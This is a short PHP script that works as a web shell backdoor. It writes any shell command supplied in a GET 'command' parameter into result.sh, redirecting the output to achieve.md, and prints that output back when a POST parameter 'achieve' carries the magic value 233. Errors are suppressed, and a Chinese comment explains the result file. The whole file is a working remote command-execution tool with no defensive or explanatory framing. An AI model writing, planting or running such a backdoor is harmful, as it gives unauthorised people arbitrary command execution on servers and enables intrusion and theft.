<?php
	$command=isset($_GET['command'])?$_GET['command']:0;
	$achieve=isset($_POST['achieve'])?$_POST['achieve']:0;
	if($command){
		@file_put_contents('./result.sh', $command." >achieve.md");//执行结果输入到achieve.md中
	}
	if($achieve==233){
		$ach=@file_get_contents('./achieve.md');
		echo $ach;
		return false ;
	}
?>
